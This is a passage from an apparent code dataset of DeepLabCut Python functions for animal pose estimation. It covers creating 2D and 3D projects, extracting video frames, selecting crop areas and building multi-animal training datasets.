    cfg_file['cropping'] = False
    cfg_file['start'] = 0
    cfg_file['stop'] = 1
    cfg_file['numframes2pick'] = 20
    cfg_file['TrainingFraction'] = [0.95]
    cfg_file['iteration'] = 0
    cfg_file['snapshotindex'] = -1
    cfg_file['x1'] = 0
    cfg_file['x2'] = 640
    cfg_file['y1'] = 277
    cfg_file['y2'] = 624
    cfg_file['batch_size'] = 8
    cfg_file['corner2move2'] = (50, 50)
    cfg_file['move2corner'] = True
    cfg_file['skeleton_color'] = 'black'
    cfg_file['pcutoff'] = 0.6
    cfg_file['dotsize'] = 12
    cfg_file['alphavalue'] = 0.7
    cfg_file['colormap'] = 'rainbow'
    projconfigfile = os.path.join(str(project_path), 'config.yaml')
    auxiliaryfunctions.write_config(projconfigfile, cfg_file)
    print('Generated ""{}""'.format(project_path / 'config.yaml'))
    print(""\nA new project with name %s is created at %s and a configurable file (config.yaml) is stored there. Change the parameters in this file to adapt to your project's needs.\n Once you have changed the configuration file, use the function 'extract_frames' to select frames for labeling.\n. [OPTIONAL] Use the function 'add_new_videos' to add new videos to your project (at any stage)."" % (project_name, str(wd)))
    return projconfigfile"
AlexEMG/DeepLabCut,create_new_project_3d,"def create_new_project_3d(project, experimenter, num_cameras=2, working_directory=None):
    """"""Creates a new project directory, sub-directories and a basic configuration file for 3d project.
    The configuration file is loaded with the default values. Adjust the parameters to your project's needs.

    Parameters
    ----------
    project : string
        String containing the name of the project.

    experimenter : string
        String containing the name of the experimenter.

    num_cameras : int
        An integer value specifying the number of cameras.

    working_directory : string, optional
        The directory where the project will be created. The default is the ``current working directory``; if provided, it must be a string.


    Example
    --------
    Linux/MacOs
    >>> deeplabcut.create_new_project_3d('reaching-task','Linus',2)

    Windows:
    >>> deeplabcut.create_new_project('reaching-task','Bill',2)
    Users must format paths with either:  r'C:\\ OR 'C:\\ <- i.e. a double backslash \\ \\ )

    """"""
    from datetime import datetime as dt
    from deeplabcut.utils import auxiliaryfunctions
    date = dt.today()
    month = date.strftime('%B')
    day = date.day
    d = str(month[0:3] + str(day))
    date = dt.today().strftime('%Y-%m-%d')
    if working_directory is None:
        working_directory = '.'
    wd = Path(working_directory).resolve()
    project_name = '{pn}-{exp}-{date}-{triangulate}'.format(pn=project, exp=experimenter, date=date, triangulate='3d')
    project_path = wd / project_name
    if not DEBUG and project_path.exists():
        print('Project ""{}"" already exists!'.format(project_path))
        return
    camera_matrix_path = project_path / 'camera_matrix'
    calibration_images_path = project_path / 'calibration_images'
    undistortion_path = project_path / 'undistortion'
    path_corners = project_path / 'corners'
    path_removed_images = project_path / 'removed_calibration_images'
    for p in [camera_matrix_path, calibration_images_path, undistortion_path, path_corners, path_removed_images]:
        p.mkdir(parents=True, exist_ok=DEBUG)
        print('Created ""{}""'.format(p))
    (cfg_file_3d, ruamelFile_3d) = auxiliaryfunctions.create_config_template_3d()
    cfg_file_3d['Task'] = project
    cfg_file_3d['scorer'] = experimenter
    cfg_file_3d['date'] = d
    cfg_file_3d['project_path'] = str(project_path)
    cfg_file_3d['colormap'] = 'jet'
    cfg_file_3d['dotsize'] = 15
    cfg_file_3d['alphaValue'] = 0.8
    cfg_file_3d['markerType'] = '*'
    cfg_file_3d['markerColor'] = 'r'
    cfg_file_3d['pcutoff'] = 0.4
    cfg_file_3d['num_cameras'] = num_cameras
    cfg_file_3d['camera_names'] = [str('camera-' + str(i)) for i in range(1, num_cameras + 1)]
    cfg_file_3d['scorername_3d'] = 'DLC_3D'
    cfg_file_3d['skeleton'] = [['bodypart1', 'bodypart2'], ['bodypart2', 'bodypart3'], ['bodypart3', 'bodypart4'], ['bodypart4', 'bodypart5']]
    cfg_file_3d['skeleton_color'] = 'black'
    for i in range(num_cameras):
        path = str('/home/mackenzie/DEEPLABCUT/DeepLabCut/2DprojectCam' + str(i + 1) + '-Mackenzie-2019-06-05/config.yaml')
        cfg_file_3d.insert(len(cfg_file_3d), str('config_file_camera-' + str(i + 1)), path)
    for i in range(num_cameras):
        cfg_file_3d.insert(len(cfg_file_3d), str('shuffle_camera-' + str(i + 1)), 1)
        cfg_file_3d.insert(len(cfg_file_3d), str('trainingsetindex_camera-' + str(i + 1)), 0)
    projconfigfile = os.path.join(str(project_path), 'config.yaml')
    auxiliaryfunctions.write_config_3d(projconfigfile, cfg_file_3d)
    print('Generated ""{}""'.format(project_path / 'config.yaml'))
    print(""\nA new project with name %s is created at %s and a configurable file (config.yaml) is stored there. If you have not calibrated the cameras, then use the function 'calibrate_camera' to start calibrating the camera otherwise use the function ``triangulate`` to triangulate the dataframe"" % (project_name, wd))
    return projconfigfile"
AlexEMG/DeepLabCut,select_cropping_area,"def select_cropping_area(config, videos=None):
    """"""
    Interactively select the cropping area of all videos in the config.
    A user interface pops up with a frame to select the cropping parameters.
    Use the left click to draw a box and hit the button 'set cropping parameters'
    to store the cropping parameters for a video in the config.yaml file.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    videos : optional (default=None)
        List of videos whose cropping areas are to be defined. Note that full paths are required.
        By default, all videos in the config are successively loaded.

    Returns
    -------
    cfg : dict
        Updated project configuration
    """"""
    from deeplabcut.utils import auxiliaryfunctions, auxfun_videos
    cfg = auxiliaryfunctions.read_config(config)
    if videos is None:
        videos = list(cfg.get('video_sets_original') or cfg['video_sets'])
    for video in videos:
        coords = auxfun_videos.draw_bbox(video)
        if coords:
            temp = {'crop': ', '.join(map(str, [int(coords[0]), int(coords[2]), int(coords[1]), int(coords[3])]))}
            try:
                cfg['video_sets'][video] = temp
            except KeyError:
                cfg['video_sets_original'][video] = temp
    auxiliaryfunctions.write_config(config, cfg)
    return cfg"
AlexEMG/DeepLabCut,extract_frames,"def extract_frames(config, mode='automatic', algo='kmeans', crop=False, userfeedback=True, cluster_step=1, cluster_resizewidth=30, cluster_color=False, opencv=True, slider_width=25, config3d=None, extracted_cam=0, videos_list=None):
    """"""Extracts frames from the project videos.

    Frames will be extracted from videos listed in the config.yaml file.

    The frames are selected from the videos in a randomly and temporally uniformly
    distributed way (``uniform``), by clustering based on visual appearance
    (``k-means``), or by manual selection.

    After frames have been extracted from all videos from one camera, matched frames
    from other cameras can be extracted using ``mode = ""match""``. This is necessary if
    you plan to use epipolar lines to improve labeling across multiple camera angles.
    It will overwrite previously extracted images from the second camera angle if
    necessary.

    Please refer to the user guide for more details on methods and parameters
    https://www.nature.com/articles/s41596-019-0176-0 or the preprint:
    https://www.biorxiv.org/content/biorxiv/early/2018/11/24/476531.full.pdf

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    mode : string. Either ``""automatic""``, ``""manual""`` or ``""match""``.
        String containing the mode of extraction. It must be either ``""automatic""`` or
        ``""manual""`` to extract the initial set of frames. It can also be ``""match""``
        to match frames between the cameras in preparation for the use of epipolar line
        during labeling; namely, extract from camera_1 first, then run this to extract
        the matched frames in camera_2.

        WARNING: if you use ``""match""``, and you previously extracted and labeled
        frames from the second camera, this will overwrite your data. This will require
        you to delete the ``collectdata(.h5/.csv)`` files before labeling. Use with
        caution!

    algo : string, Either ``""kmeans""`` or ``""uniform""``, Default: `""kmeans""`.
        String specifying the algorithm to use for selecting the frames. Currently,
        deeplabcut supports either ``kmeans`` or ``uniform`` based selection. This flag
        is only required for ``automatic`` mode and the default is ``kmeans``. For
        ``""uniform""``, frames are picked in temporally uniform way, ``""kmeans""``
        performs clustering on downsampled frames (see user guide for details).

        NOTE: Color information is discarded for ``""kmeans""``, thus e.g. for
        camouflaged octopus clustering one might want to change this.

    crop : bool or str, optional
        If ``True``, video frames are cropped according to the corresponding
        coordinates stored in the project configuration file. Alternatively, if
        cropping coordinates are not known yet, crop=``""GUI""`` triggers a user
        interface where the cropping area can be manually drawn and saved.

    userfeedback: bool, optional
        If this is set to ``False`` during ``""automatic""`` mode then frames for all
        videos are extracted. The user can set this to ``""True""``, which will result in
        a dialog, where the user is asked for each video if (additional/any) frames
        from this video should be extracted. Use this, e.g. if you have already labeled
        some folders and want to extract data for new videos.

    cluster_resizewidth: int, default: 30
        For ``""k-means""`` one can change the width to which the images are downsampled
        (aspect ratio is fixed).

    cluster_step: int, default: 1
        By default each frame is used for clustering, but for long videos one could
        only use every nth frame (set using this parameter). This saves memory before
        clustering can start, however, reading the individual frames takes longer due
        to the skipping.

    cluster_color: bool, default: False
        If ``""False""`` then each downsampled image is treated as a grayscale vector
        (discarding color information). If ``""True""``, then the color channels are
        considered. This increases the computational complexity.

    opencv: bool, default: True
        Uses openCV for loading & extractiong (otherwise moviepy (legacy)).

    slider_width: int, default: 25
        Width of the video frames slider, in percent of window.

    config3d: string, optional
        Path to the project configuration file in the 3D project. This will be used to
        match frames extracted from all cameras present in the field 'camera_names' to
        the frames extracted from the camera given by the parameter 'extracted_cam'.

    extracted_cam: int, default: 0
        The index of the camera that already has extracted frames. This will match
        frame numbers to extract for all other cameras. This parameter is necessary if
        you wish to use epipolar lines in the labeling toolbox. Only use if
        ``mode='match'`` and ``config3d`` is provided.

    videos_list: list[str], Default: None
        A list of the string containing full paths to videos to extract frames for. If
        this is left as ``None`` all videos specified in the config file will have
        frames extracted. Otherwise one can select a subset by passing those paths.

    Returns
    -------
    None

    Notes
    -----
    Use the function ``add_new_videos`` at any stage of the project to add new videos
    to the config file and extract their frames.

    The following parameters for automatic extraction are used from the config file

    * ``numframes2pick``
    * ``start`` and ``stop``

    While selecting the frames manually, you do not need to specify the ``crop``
    parameter in the command. Rather, you will get a prompt in the graphic user
    interface to choose if you need to crop or not.

    Examples
    --------
    To extract frames automatically with 'kmeans' and then crop the frames

    >>> deeplabcut.extract_frames(
            config='/analysis/project/reaching-task/config.yaml',
            mode='automatic',
            algo='kmeans',
            crop=True,
        )

    To extract frames automatically with 'kmeans' and then defining the cropping area
    using a GUI

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml',
            'automatic',
            'kmeans',
            'GUI',
        )

    To consider the color information when extracting frames automatically with
    'kmeans'

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml',
            'automatic',
            'kmeans',
            cluster_color=True,
        )

    To extract frames automatically with 'uniform' and then crop the frames

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml',
            'automatic',
            'uniform',
            crop=True,
        )

    To extract frames manually

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml', 'manual'
        )

    To extract frames manually, with a 60% wide frames slider

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml', 'manual', slider_width=60,
        )

    To extract frames from a second camera that match the frames extracted from the
    first

    >>> deeplabcut.extract_frames(
            '/analysis/project/reaching-task/config.yaml',
            mode='match',
            extracted_cam=0,
        )
    """"""
    import os
    import sys
    import re
    import glob
    import numpy as np
    from pathlib import Path
    from skimage import io
    from skimage.util import img_as_ubyte
    from deeplabcut.utils import frameselectiontools
    from deeplabcut.utils import auxiliaryfunctions
    config_file = Path(config).resolve()
    cfg = auxiliaryfunctions.read_config(config_file)
    print('Config file read successfully.')
    if videos_list is None:
        videos = cfg.get('video_sets_original') or cfg['video_sets']
    else:
        videos = [v for v in cfg['video_sets'] if v in videos_list]
    if mode == 'manual':
        from deeplabcut.gui.widgets import launch_napari
        _ = launch_napari(videos[0])
        return
    elif mode == 'automatic':
        numframes2pick = cfg['numframes2pick']
        start = cfg['start']
        stop = cfg['stop']
        if start > 1 or stop > 1 or start < 0 or (stop < 0) or (start >= stop):
            raise Exception('Erroneous start or stop values. Please correct it in the config file.')
        if numframes2pick < 1 and (not int(numframes2pick)):
            raise Exception('Perhaps consider extracting more, or a natural number of frames.')
        if opencv:
            from deeplabcut.utils.auxfun_videos import VideoWriter
        else:
            from moviepy.editor import VideoFileClip
        has_failed = []
        for video in videos:
            if userfeedback:
                print('Do you want to extract (perhaps additional) frames for video:', video, '?')
                askuser = input('yes/no')
            else:
                askuser = 'yes'
            if askuser == 'y' or askuser == 'yes' or askuser == 'Ja' or (askuser == 'ha') or (askuser == 'oui') or (askuser == 'ouais'):
                if opencv:
                    cap = VideoWriter(video)
                    nframes = len(cap)
                else:
                    clip = VideoFileClip(video)
                    fps = clip.fps
                    nframes = int(np.ceil(clip.duration * 1.0 / fps))
                if not nframes:
                    print('Video could not be opened. Skipping...')
                    continue
                indexlength = int(np.ceil(np.log10(nframes)))
                fname = Path(video)
                output_path = Path(config).parents[0] / 'labeled-data' / fname.stem
                if output_path.exists():
                    if len(os.listdir(output_path)):
                        if userfeedback:
                            askuser = input('The directory already contains some frames. Do you want to add to it?(yes/no): ')
                        if not (askuser == 'y' or askuser == 'yes' or askuser == 'Y' or (askuser == 'Yes')):
                            sys.exit('Delete the frames and try again later!')
                if crop == 'GUI':
                    cfg = select_cropping_area(config, [video])
                try:
                    coords = cfg['video_sets'][video]['crop'].split(',')
                except KeyError:
                    coords = cfg['video_sets_original'][video]['crop'].split(',')
                if crop:
                    if opencv:
                        cap.set_bbox(*map(int, coords))
                    else:
                        clip = clip.crop(y1=int(coords[2]), y2=int(coords[3]), x1=int(coords[0]), x2=int(coords[1]))
                else:
                    coords = None
                print('Extracting frames based on %s ...' % algo)
                if algo == 'uniform':
                    if opencv:
                        frames2pick = frameselectiontools.UniformFramescv2(cap, numframes2pick, start, stop)
                    else:
                        frames2pick = frameselectiontools.UniformFrames(clip, numframes2pick, start, stop)
                elif algo == 'kmeans':
                    if opencv:
                        frames2pick = frameselectiontools.KmeansbasedFrameselectioncv2(cap, numframes2pick, start, stop, step=cluster_step, resizewidth=cluster_resizewidth, color=cluster_color)
                    else:
                        frames2pick = frameselectiontools.KmeansbasedFrameselection(clip, numframes2pick, start, stop, step=cluster_step, resizewidth=cluster_resizewidth, color=cluster_color)
                else:
                    print(""Please implement this method yourself and send us a pull request! Otherwise, choose 'uniform' or 'kmeans'."")
                    frames2pick = []
                if not len(frames2pick):
                    print('Frame selection failed...')
                    return
                output_path = Path(config).parents[0] / 'labeled-data' / Path(video).stem
                output_path.mkdir(parents=True, exist_ok=True)
                is_valid = []
                if opencv:
                    for index in frames2pick:
                        cap.set_to_frame(index)
                        frame = cap.read_frame(crop=True)
                        if frame is not None:
                            image = img_as_ubyte(frame)
                            img_name = str(output_path) + '/img' + str(index).zfill(indexlength) + '.png'
                            io.imsave(img_name, image)
                            is_valid.append(True)
                        else:
                            print('Frame', index, ' not found!')
                            is_valid.append(False)
                    cap.close()
                else:
                    for index in frames2pick:
                        try:
                            image = img_as_ubyte(clip.get_frame(index * 1.0 / clip.fps))
                            img_name = str(output_path) + '/img' + str(index).zfill(indexlength) + '.png'
                            io.imsave(img_name, image)
                            if np.var(image) == 0:
                                print('Seems like black/constant images are extracted from your video. Perhaps consider using opencv under the hood, by setting: opencv=True')
                            is_valid.append(True)
                        except FileNotFoundError:
                            print('Frame # ', index, ' does not exist.')
                            is_valid.append(False)
                    clip.close()
                    del clip
                if not any(is_valid):
                    has_failed.append(True)
                else:
                    has_failed.append(False)
            else:
                has_failed.append(False)
        if all(has_failed):
            print('Frame extraction failed. Video files must be corrupted.')
            return
        elif any(has_failed):
            print('Although most frames were extracted, some were invalid.')
        else:
            print('Frames were successfully extracted, for the videos listed in the config.yaml file.')
        print(""\nYou can now label the frames using the function 'label_frames' (Note, you should label frames extracted from diverse videos (and many videos; we do not recommend training on single videos!))."")
    elif mode == 'match':
        import cv2
        config_file = Path(config).resolve()
        cfg = auxiliaryfunctions.read_config(config_file)
        print('Config file read successfully.')
        videos = sorted(cfg['video_sets'].keys())
        if videos_list is not None:
            videos = [v for v in videos if v in videos_list]
        project_path = Path(config).parents[0]
        labels_path = os.path.join(project_path, 'labeled-data/')
        video_dir = os.path.join(project_path, 'videos/')
        try:
            cfg_3d = auxiliaryfunctions.read_config(config3d)
        except:
            raise Exception('You must create a 3D project and edit the 3D config file before extracting matched frames. \n')
        cams = cfg_3d['camera_names']
        extCam_name = cams[extracted_cam]
        del cams[extracted_cam]
        label_dirs = sorted(glob.glob(os.path.join(labels_path, '*' + extCam_name + '*')))
        crop_list = []
        for video in videos:
            if extCam_name in video:
                if crop == 'GUI':
                    cfg = select_cropping_area(config, [video])
                    print('in gui code')
                coords = cfg['video_sets'][video]['crop'].split(',')
                if crop and (not opencv):
                    clip = clip.crop(y1=int(coords[2]), y2=int(coords[3]), x1=int(coords[0]), x2=int(coords[1]))
                elif not crop:
                    coords = None
                crop_list.append(coords)
        for (coords, dirPath) in zip(crop_list, label_dirs):
            extracted_images = glob.glob(os.path.join(dirPath, '*png'))
            imgPattern = re.compile('[0-9]{1,10}')
            for cam in cams:
                output_path = re.sub(extCam_name, cam, dirPath)
                for fname in os.listdir(output_path):
                    if fname.endswith('.png'):
                        os.remove(os.path.join(output_path, fname))
                video_name = os.path.basename(output_path)
                vid = ''
                for video in cfg['video_sets']:
                    if video_name in video:
                        vid = video
                        break
                if not vid:
                    raise ValueError(f'Video {video_name} not found...')
                cap = cv2.VideoCapture(vid)
                print('\n extracting matched frames from ' + video_name)
                for img in extracted_images:
                    imgNum = re.findall(imgPattern, os.path.basename(img))[0]
                    cap.set(1, int(imgNum))
                    (ret, frame) = cap.read()
                    if ret:
                        image = img_as_ubyte(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
                        img_name = os.path.join(output_path, 'img' + imgNum + '.png')
                        if crop:
                            io.imsave(img_name, image[int(coords[2]):int(coords[3]), int(coords[0]):int(coords[1]), :])
                        else:
                            io.imsave(img_name, image)
        print('\n Done extracting matched frames. You can now begin labeling frames using the function label_frames\n')
    else:
        print(""Invalid MODE. Choose either 'manual', 'automatic' or 'match'. Check ``help(deeplabcut.extract_frames)`` on python and ``deeplabcut.extract_frames?``               for ipython/jupyter notebook for more details."")"
AlexEMG/DeepLabCut,format_multianimal_training_data,"def format_multianimal_training_data(df, train_inds, project_path, n_decimals=2):
    train_data = []
    nrows = df.shape[0]
    filenames = df.index.to_list()
    n_bodyparts = df.columns.get_level_values('bodyparts').unique().size
    individuals = df.columns.get_level_values('individuals')
    n_individuals = individuals.unique().size
    mask_single = individuals.str.contains('single')
    n_animals = n_individuals - 1 if np.any(mask_single) else n_individuals
    array = np.full((nrows, n_individuals, n_bodyparts, 3), fill_value=np.nan, dtype=np.float32)
    array[..., 0] = np.arange(n_bodyparts)
    temp = df.to_numpy()
    temp_multi = temp[:, ~mask_single].reshape((nrows, n_animals, -1, 2))
    n_multibodyparts = temp_multi.shape[2]
    array[:, :n_animals, :n_multibodyparts, 1:] = temp_multi
    if n_animals != n_individuals:
        n_uniquebodyparts = n_bodyparts - n_multibodyparts
        temp_single = np.reshape(temp[:, mask_single], (nrows, 1, n_uniquebodyparts, 2))
        array[:, -1:, -n_uniquebodyparts:, 1:] = temp_single
    array = np.round(array, decimals=n_decimals)
    for i in tqdm(train_inds):
        filename = filenames[i]
        img_shape = read_image_shape_fast(os.path.join(project_path, *filename))
        joints = dict()
        has_data = False
        for (n, xy) in enumerate(array[i]):
            xy = xy[~np.isnan(xy).any(axis=1)]
            inside = np.logical_and.reduce((xy[:, 1] < img_shape[2], xy[:, 1] > 0, xy[:, 2] < img_shape[1], xy[:, 2] > 0))
            xy = xy[inside]
            if xy.size:
                has_data = True
                joints[n] = xy
        if has_data:
            data = {'image': filename, 'size': np.asarray(img_shape), 'joints': joints}
            train_data.append(data)
    return train_data"
AlexEMG/DeepLabCut,create_multianimaltraining_dataset,"def create_multianimaltraining_dataset(config, num_shuffles=1, Shuffles=None, windows2linux=False, net_type=None, numdigits=2, crop_size=(400, 400), crop_sampling='hybrid', paf_graph=None, trainIndices=None, testIndices=None, n_edges_threshold=105, paf_graph_degree=6):
    """"""
    Creates a training dataset for multi-animal datasets. Labels from all the extracted frames are merged into a single .h5 file.

    Only the videos included in the config file are used to create this dataset.

    [OPTIONAL] Use the function 'add_new_videos' at any stage of the project to add more videos to the project.

    Important differences to standard:
     - stores coordinates with numdigits as many digits
     - creates
    Parameter
    ----------
    config : string
        Full path of the config.yaml file as a string.

    num_shuffles : int, optional
        Number of shuffles of training dataset to create, i.e. [1,2,3] for num_shuffles=3. Default is set to 1.

    Shuffles: list of shuffles.
        Alternatively the user can also give a list of shuffles (integers!).

    net_type: string
        Type of networks. Currently resnet_50, resnet_101, and resnet_152, efficientnet-b0, efficientnet-b1, efficientnet-b2, efficientnet-b3,
        efficientnet-b4, efficientnet-b5, and efficientnet-b6 as well as dlcrnet_ms5 are supported (not the MobileNets!).
        See Lauer et al. 2021 https://www.biorxiv.org/content/10.1101/2021.04.30.442096v1

    numdigits: int, optional

    crop_size: tuple of int, optional
        Dimensions (width, height) of the crops for data augmentation.
        Default is 400x400.

    crop_sampling: str, optional
        Crop centers sampling method. Must be either:
        ""uniform"" (randomly over the image),
        ""keypoints"" (randomly over the annotated keypoints),
        ""density"" (weighing preferentially dense regions of keypoints),
        or ""hybrid"" (alternating randomly between ""uniform"" and ""density"").
        Default is ""hybrid"".

    paf_graph: list of lists, or ""config"" optional (default=None)
        If not None, overwrite the default complete graph. This is useful for advanced users who
        already know a good graph, or simply want to use a specific one. Note that, in that case,
        the data-driven selection procedure upon model evaluation will be skipped.

        ""config"" will use the skeleton defined in the config file.

    trainIndices: list of lists, optional (default=None)
        List of one or multiple lists containing train indexes.
        A list containing two lists of training indexes will produce two splits.

    testIndices: list of lists, optional (default=None)
        List of one or multiple lists containing test indexes.

    n_edges_threshold: int, optional (default=105)
        Number of edges above which the graph is automatically pruned.

    paf_graph_degree: int, optional (default=6)
        Degree of paf_graph when automatically pruning it (before training).

    Example
    --------
    >>> deeplabcut.create_multianimaltraining_dataset('/analysis/project/reaching-task/config.yaml',num_shuffles=1)

    >>> deeplabcut.create_multianimaltraining_dataset('/analysis/project/reaching-task/config.yaml', Shuffles=[0,1,2], trainIndices=[trainInd1, trainInd2, trainInd3], testIndices=[testInd1, testInd2, testInd3])

    Windows:
    >>> deeplabcut.create_multianimaltraining_dataset(r'C:\\Users\\Ulf\\looming-task\\config.yaml',Shuffles=[3,17,5])
    --------
    """"""
    if windows2linux:
        warnings.warn('`windows2linux` has no effect since 2.2.0.4 and will be removed in 2.2.1.', FutureWarning)
    if len(crop_size) != 2 or not all((isinstance(v, int) for v in crop_size)):
        raise ValueError('Crop size must be a tuple of two integers (width, height).')
    if crop_sampling not in ('uniform', 'keypoints', 'density', 'hybrid'):
        raise ValueError(f""Invalid sampling {crop_sampling}. Must be either 'uniform', 'keypoints', 'density', or 'hybrid."")
    cfg = auxiliaryfunctions.read_config(config)
    scorer = cfg['scorer']
    project_path = cfg['project_path']
    trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
    full_training_path = Path(project_path, trainingsetfolder)
    auxiliaryfunctions.attempt_to_make_folder(full_training_path, recursive=True)
    Data = merge_annotateddatasets(cfg, full_training_path)
    if Data is None:
        return
    Data = Data[scorer]
    if net_type is None:
        net_type = cfg.get('default_net_type', 'dlcrnet_ms5')
    elif not any((net in net_type for net in ('resnet', 'eff', 'dlc', 'mob'))):
        raise ValueError(f'Unsupported network {net_type}.')
    multi_stage = False
    if all((net in net_type for net in ('dlcr', '_ms5'))):
        num_layers = re.findall('dlcr([0-9]*)', net_type)[0]
        if num_layers == '':
            num_layers = 50
        net_type = 'resnet_{}'.format(num_layers)
        multi_stage = True
    dataset_type = 'multi-animal-imgaug'
    (individuals, uniquebodyparts, multianimalbodyparts) = auxfun_multianimal.extractindividualsandbodyparts(cfg)
    if paf_graph is None:
        n_bpts = len(multianimalbodyparts)
        partaffinityfield_graph = [list(edge) for edge in combinations(range(n_bpts), 2)]
        n_edges_orig = len(partaffinityfield_graph)
        if n_edges_orig >= n_edges_threshold:
            partaffinityfield_graph = auxfun_multianimal.prune_paf_graph(partaffinityfield_graph, average_degree=paf_graph_degree)
    else:
        if paf_graph == 'config':
            skeleton = cfg['skeleton']
            paf_graph = [sorted((multianimalbodyparts.index(bpt1), multianimalbodyparts.index(bpt2))) for (bpt1, bpt2) in skeleton]
            print('Using `skeleton` from the config file as a paf_graph. Data-driven skeleton will not be computed.')
        to_ignore = auxfun_multianimal.filter_unwanted_paf_connections(cfg, paf_graph)
        partaffinityfield_graph = [edge for (i, edge) in enumerate(paf_graph) if i not in to_ignore]
        auxfun_multianimal.validate_paf_graph(cfg, partaffinityfield_graph)
    print('Utilizing the following graph:', partaffinityfield_graph)
    partaffinityfield_predict = bool(partaffinityfield_graph)
    dlcparent_path = auxiliaryfunctions.get_deeplabcut_path()
    defaultconfigfile = os.path.join(dlcparent_path, 'pose_cfg.yaml')
    model_path = auxfun_models.check_for_weights(net_type, Path(dlcparent_path))
    if Shuffles is None:
        Shuffles = range(1, num_shuffles + 1, 1)
    else:
        Shuffles = [i for i in Shuffles if isinstance(i, int)]
    if trainIndices is None and testIndices is None:
        splits = []
        for shuffle in Shuffles:
            for train_frac in cfg['TrainingFraction']:
                (train_inds, test_inds) = SplitTrials(range(len(Data)), train_frac)
                splits.append((train_frac, shuffle, (train_inds, test_inds)))
    else:
        if len(trainIndices) != len(testIndices) != len(Shuffles):
            raise ValueError('Number of Shuffles and train and test indexes should be equal.')
        splits = []
        for (shuffle, (train_inds, test_inds)) in enumerate(zip(trainIndices, testIndices)):
            trainFraction = round(len(train_inds) * 1.0 / (len(train_inds) + len(test_inds)), 2)
            print(f'You passed a split with the following fraction: {int(100 * trainFraction)}%')
            train_inds = np.asarray(train_inds)
            train_inds = train_inds[train_inds != -1]
            test_inds = np.asarray(test_inds)
            test_inds = test_inds[test_inds != -1]
            splits.append((trainFraction, Shuffles[shuffle], (train_inds, test_inds)))
    for (trainFraction, shuffle, (trainIndices, testIndices)) in splits:
        print('Creating training data for: Shuffle:', shuffle, 'TrainFraction: ', trainFraction)
        data = format_multianimal_training_data(Data, trainIndices, cfg['project_path'], numdigits)
        if len(trainIndices) > 0:
            (datafilename, metadatafilename) = auxiliaryfunctions.get_data_and_metadata_filenames(trainingsetfolder, trainFraction, shuffle, cfg)
            auxiliaryfunctions.save_metadata(os.path.join(project_path, metadatafilename), data, trainIndices, testIndices, trainFraction)
            datafilename = datafilename.split('.mat')[0] + '.pickle'
            import pickle
            with open(os.path.join(project_path, datafilename), 'wb') as f:
                pickle.dump(data, f, pickle.HIGHEST_PROTOCOL)
            modelfoldername = auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg)
            auxiliaryfunctions.attempt_to_make_folder(Path(config).parents[0] / modelfoldername, recursive=True)
            auxiliaryfunctions.attempt_to_make_folder(str(Path(config).parents[0] / modelfoldername / 'train'))
            auxiliaryfunctions.attempt_to_make_folder(str(Path(config).parents[0] / modelfoldername / 'test'))
            path_train_config = str(os.path.join(cfg['project_path'], Path(modelfoldername), 'train', 'pose_cfg.yaml'))
            path_test_config = str(os.path.join(cfg['project_path'], Path(modelfoldername), 'test', 'pose_cfg.yaml'))
            path_inference_config = str(os.path.join(cfg['project_path'], Path(modelfoldername), 'test', 'inference_cfg.yaml'))
            jointnames = [str(bpt) for bpt in multianimalbodyparts]
            jointnames.extend([str(bpt) for bpt in uniquebodyparts])
            items2change = {'dataset': datafilename, 'metadataset': metadatafilename, 'num_joints': len(multianimalbodyparts) + len(uniquebodyparts), 'all_joints': [[i] for i in range(len(multianimalbodyparts) + len(uniquebodyparts))], 'all_joints_names': jointnames, 'init_weights': model_path, 'project_path': str(cfg['project_path']), 'net_type': net_type, 'multi_stage': multi_stage, 'pairwise_loss_weight': 0.1, 'pafwidth': 20, 'partaffinityfield_graph': partaffinityfield_graph, 'partaffinityfield_predict': partaffinityfield_predict, 'weigh_only_present_joints': False, 'num_limbs': len(partaffinityfield_graph), 'dataset_type': dataset_type, 'optimizer': 'adam', 'batch_size': 8, 'multi_step': [[0.0001, 7500], [5 * 1e-05, 12000], [1e-05, 200000]], 'save_iters': 10000, 'display_iters': 500, 'num_idchannel': len(cfg['individuals']) if cfg.get('identity', False) else 0, 'crop_size': list(crop_size), 'crop_sampling': crop_sampling}
            trainingdata = MakeTrain_pose_yaml(items2change, path_train_config, defaultconfigfile)
            keys2save = ['dataset', 'num_joints', 'all_joints', 'all_joints_names', 'net_type', 'multi_stage', 'init_weights', 'global_scale', 'location_refinement', 'locref_stdev', 'dataset_type', 'partaffinityfield_predict', 'pairwise_predict', 'partaffinityfield_graph', 'num_limbs', 'dataset_type', 'num_idchannel']
            MakeTest_pose_yaml(trainingdata, keys2save, path_test_config, nmsradius=5.0, minconfidence=0.01, sigma=1, locref_smooth=False)
            defaultinference_configfile = os.path.join(dlcparent_path, 'inference_cfg.yaml')
            items2change = {'minimalnumberofconnections': int(len(cfg['multianimalbodyparts']) / 2), 'topktoretain': len(cfg['individuals']), 'withid': cfg.get('identity', False)}
            MakeInference_yaml(items2change, path_inference_config, defaultinference_configfile)
            print(""The training dataset is successfully created. Use the function 'train_network' to start training. Happy training!"")
        else:
            pass"
AlexEMG/DeepLabCut,convert_cropped_to_standard_dataset,"def convert_cropped_to_standard_dataset(config_path, recreate_datasets=True, delete_crops=True, back_up=True):
    import pandas as pd
    import pickle
    import shutil
    from deeplabcut.generate_training_dataset import trainingsetmanipulation
    from deeplabcut.utils import read_plainconfig, write_config
    cfg = auxiliaryfunctions.read_config(config_path)
    videos_orig = cfg.pop('video_sets_original')
    is_cropped = cfg.pop('croppedtraining')
    if videos_orig is None or not is_cropped:
        print('Labeled data do not appear to be cropped. Project will remain unchanged...')
        return
    project_path = cfg['project_path']
    if back_up:
        print('Backing up project...')
        shutil.copytree(project_path, project_path + '_bak', symlinks=True)
    if delete_crops:
        print('Deleting crops...')
        data_path = os.path.join(project_path, 'labeled-data')
        for video in cfg['video_sets']:
            (_, filename, _) = trainingsetmanipulation._robust_path_split(video)
            if '_cropped' in video:
                shutil.rmtree(os.path.join(data_path, filename), ignore_errors=True)
